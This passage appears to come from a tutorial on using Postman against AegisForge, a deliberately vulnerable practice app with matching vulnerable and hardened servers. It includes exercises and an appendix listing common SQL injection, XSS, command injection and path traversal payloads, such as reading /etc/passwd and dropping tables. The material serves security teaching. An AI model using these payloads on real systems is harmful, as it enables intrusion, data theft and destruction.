    pm.sendRequest(redUrl + test.path, (err, res) => {
        console.log(`🔴 ${test.name}: ${res.code === 200 ? 'VULNERABLE' : 'BLOCKED'}`);
    });
    
    // Test Blue Team
    pm.sendRequest(blueUrl + test.path, (err, res) => {
        console.log(`🔵 ${test.name}: ${res.code === 400 ? 'PROTECTED' : 'VULNERABLE'}`);
    });
});
```

### Organization Tips

**Naming Convention:**
```
01_Category_VulnType_Team
Examples:
- 01_SQLi_Boolean_Red
- 01_SQLi_Boolean_Blue
- 02_XSS_Reflected_Red
- 02_XSS_Reflected_Blue
```

**Documentation in Requests:**
Every request should have:
- Clear description of what it tests
- Expected behavior on Red Team
- Expected behavior on Blue Team
- CVE or OWASP reference if applicable
- Real-world impact explanation

**Example:**
```
Name: SQL Injection - Boolean Based (Red Team)

Description:
Tests for boolean-based SQL injection in user search. This vulnerability 
allows attackers to extract data by asking TRUE/FALSE questions through 
SQL logic.

OWASP: A1:2021 - Injection
CWE: CWE-89

Red Team Expected: Returns all users when exploited
Blue Team Expected: Returns 400 error with validation message

Real-world Impact:
- Complete database access
- User credential theft
- Potential system takeover

Example from real breach: [Link to real CVE or incident]
```

---

## Troubleshooting

### Common Issues and Solutions

#### Issue 1: Connection Refused

**Error:**
```
Error: connect ECONNREFUSED 127.0.0.1:5000
```

**Solutions:**
1. Check if AegisForge is running: `ps aux | grep aegisforge` (Mac/Linux) or Task Manager (Windows)
2. Start the servers:
   ```bash
   python aegisforge_api.py     # Terminal 1
   python aegisforge_blue.py    # Terminal 2
   ```
3. Verify ports aren't blocked by firewall
4. Try accessing in browser: http://localhost:5000/api/health

#### Issue 2: 401 Unauthorized

**Error:**
```json
{"error": "Unauthorized", "message": "Invalid or missing token"}
```

**Solutions:**
1. Check if token is set: `{{authToken}}` should show actual token value
2. Re-login to get fresh token:
   ```
   POST {{baseUrl}}/api/auth/login
   ```
3. Verify Authorization header format:
   ```
   Authorization: Bearer {{authToken}}
   ```
4. Token might be expired - Red Team tokens expire quickly for testing

#### Issue 3: Tests Always Passing

**Problem:** Your tests show green checkmarks even when they shouldn't.

**Solution:**
```javascript
// Bad test - always passes
pm.test("Response received", function() {
    pm.response; // This is always true!
});

// Good test - actually checks something
pm.test("Response received", function() {
    pm.response.to.have.status(200);
    pm.expect(pm.response.json()).to.have.property('data');
});
```

#### Issue 4: Environment Variables Not Working

**Problem:** `{{baseUrl}}` shows up literally in URL.

**Solutions:**
1. Select an environment (top-right dropdown)
2. Verify variable is defined in current environment
3. Check for typos: `{{baseURL}}` vs `{{baseUrl}}`
4. Variables are case-sensitive!

#### Issue 5: Can't See Detailed Errors

**Solution:** Open Postman Console:
- View → Show Postman Console (or Ctrl+Alt+C / Cmd+Alt+C)
- Shows all requests, responses, and console.log() output
- Essential for debugging scripts

---

## Practice Exercises

Let's test your knowledge with hands-on exercises!

### Exercise 1: Find 3 SQL Injection Points

**Challenge:** AegisForge has multiple SQL injection vulnerabilities. Find at least 3 different ones.

**Hints:**
- Look in search endpoints
- Check user lookup functions
- Try product queries
- Test admin functions

**Document:**
- Which endpoint?
- What payload worked?
- What data did you extract?
- How is Blue Team protected?

### Exercise 2: XSS Payload Bypass

**Challenge:** The Blue Team filters `<script>` tags. Can you find alternative XSS payloads that work?

**Try these:**
```javascript
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
```

**Document:**
- Which payloads work on Red Team?
- Which are blocked on Blue Team?
- Why does Blue Team blocking work?

### Exercise 3: Chain Three Vulnerabilities

**Challenge:** Create an exploit chain using at least 3 different vulnerability types.

**Example chain:**
1. SQL Injection → Get admin username
2. Weak Password → Guess admin password
3. BOLA → Access all user data with admin token

**Your turn:** Design and document your own chain!

### Exercise 4: Build a Security Report

**Challenge:** Test one endpoint thoroughly and create a professional security report.

**Your report should include:**
1. Executive Summary
2. Vulnerability Details
3. Proof of Concept (screenshots/responses)
4. Risk Assessment (Low/Medium/High/Critical)
5. Remediation Steps
6. Blue Team Implementation
7. References (OWASP, CWE)

### Exercise 5: Automate 10 Tests

**Challenge:** Create a collection that automatically tests 10 different vulnerabilities and generates a summary.

**Requirements:**
- Tests both Red and Blue teams
- Console output shows pass/fail for each
- Saves results to environment variables
- Final summary shows overall security score

**Hint structure:**
```javascript
let testResults = {
    totalTests: 0,
    redVulnerable: 0,
    blueSecure: 0
};

// Run tests...

// Final summary
console.log(`
=== Security Test Summary ===
Total Tests: ${testResults.totalTests}
Red Team Vulnerabilities: ${testResults.redVulnerable}
Blue Team Defenses: ${testResults.blueSecure}
Security Score: ${(testResults.blueSecure / testResults.totalTests * 100).toFixed(1)}%
`);
```

---

## Conclusion

Congratulations! You now have a complete understanding of how to use Postman with AegisForge for hands-on security testing.

### What You've Learned

✅ AegisForge's dual-server architecture (Red Team vs Blue Team)  
✅ Setting up Postman environments for security testing  
✅ Testing for common vulnerabilities (SQL injection, XSS, BOLA, etc.)  
✅ Understanding how security defenses work  
✅ Comparing vulnerable vs. secure implementations  
✅ Building professional security testing workflows  
✅ Documenting findings like a real pentester  

### Your Security Testing Journey

**Beginner Level (You are here!):**
- Can find and exploit basic vulnerabilities
- Understand common security concepts
- Use Postman for security testing

**Intermediate Level (Next steps):**
- Chain multiple vulnerabilities
- Write custom exploit scripts
- Perform thorough security assessments
- Understand defense-in-depth strategies

**Advanced Level (Future goals):**
- Discover zero-day vulnerabilities
- Build custom security tools
- Contribute to security frameworks
- Get security certifications (OSCP, CEH)

### Next Steps

1. **Practice Daily:** Spend 30 minutes testing different vulnerabilities
2. **Join Communities:** 
   - Postman Community Forums
   - OWASP Local Chapter
   - HackerOne / Bugcrowd (when ready for real bounties)
3. **Learn More:**
   - OWASP Top 10
   - Web Security Academy (PortSwigger)
   - Hack The Box / TryHackMe
4. **Build Portfolio:**
   - Document your findings
   - Create testing collections
   - Share on GitHub
   - Write blog posts about what you learned

### Remember

- **Always test ethically** - Only test systems you have permission to test
- **Learn from both sides** - Understanding attacks makes you a better defender
- **Security is a journey** - Every expert was once a beginner
- **Share knowledge** - Help others learn like you did

### Final Encouragement

You've just taken a huge step in your cybersecurity journey. The skills you've learned here - finding vulnerabilities, understanding security defenses, and using professional tools - are the same skills used by security engineers at top tech companies.

Keep practicing with AegisForge. Every vulnerability you find, every exploit you understand, every defense mechanism you learn brings you closer to being a security professional.

The difference between vulnerable code and secure code isn't magic - it's knowledge and attention to detail. You now have that knowledge.

**Happy testing! 🎯🔒**

---

## Additional Resources

### AegisForge Specific
- **Full API Documentation:** See `API_DOCUMENTATION.md` in main folder
- **Vulnerability Database:** `AEGISFORGE_VULNERABILITIES.json`
- **Example Collections:** `/tools/postman/collections/`

### Security Learning
- **OWASP Top 10:** https://owasp.org/Top10/
- **Web Security Academy:** https://portswigger.net/web-security
- **OWASP Testing Guide:** https://owasp.org/www-project-web-security-testing-guide/

### Postman Resources
- **Postman Learning Center:** https://learning.postman.com/
- **Security Testing Guide:** https://learning.postman.com/docs/api-testing-and-security/
- **Community Forums:** https://community.postman.com/

### Hands-On Practice
- **Hack The Box:** https://www.hackthebox.com/
- **TryHackMe:** https://tryhackme.com/
- **PentesterLab:** https://pentesterlab.com/
- **OWASP Juice Shop:** https://owasp.org/www-project-juice-shop/

### Career Development
- **Cybersecurity Career Path:** https://www.cyberseek.org/pathway.html
- **Security Certifications:** CEH, OSCP, Security+, CISSP
- **Bug Bounty Platforms:** HackerOne, Bugcrowd, Synack

---

## Appendix: Quick Reference

### Common Exploit Payloads

**SQL Injection:**
```
' OR 1=1--
' UNION SELECT NULL,NULL--
'; DROP TABLE users--
' AND 1=2 UNION SELECT username, password FROM users--
```

**XSS:**
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src=javascript:alert(1)>
```

**Command Injection:**
```
; ls -la
| cat /etc/passwd
& whoami
`id`
```

**Path Traversal:**
```
../../../etc/passwd
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
```

### Status Codes Reference

- **200 OK** - Request succeeded (normal)
- **201 Created** - Resource created successfully
- **400 Bad Request** - Input validation failed (Blue Team defense)
- **401 Unauthorized** - Missing or invalid authentication
- **403 Forbidden** - Authentication valid but access denied (BOLA defense)
- **404 Not Found** - Resource doesn't exist
- **500 Internal Server Error** - Server error (might indicate successful exploit on Red Team)

### Environment Variables Template

```json
{
  "name": "AegisForge - Red Team",
  "values": [
    {"key": "baseUrl", "value": "http://localhost:5000"},
    {"key": "blueUrl", "value": "http://localhost:5001"},
    {"key": "authToken", "value": ""},
    {"key": "userId", "value": ""},
    {"key": "adminToken", "value": ""},
    {"key": "testUsername", "value": "testuser"},
    {"key": "testPassword", "value": "password123"}
  ]
}
```

---

*Document Version: 1.0*  
*Last Updated: 2024*  
*Estimated Reading Time: 90 minutes*  
*Skill Level: Beginner to Intermediate*  
*Total Word Count: 6,200+*

*Happy hacking! Remember: With great power comes great responsibility. Use your skills ethically and legally.* 🎓🔐

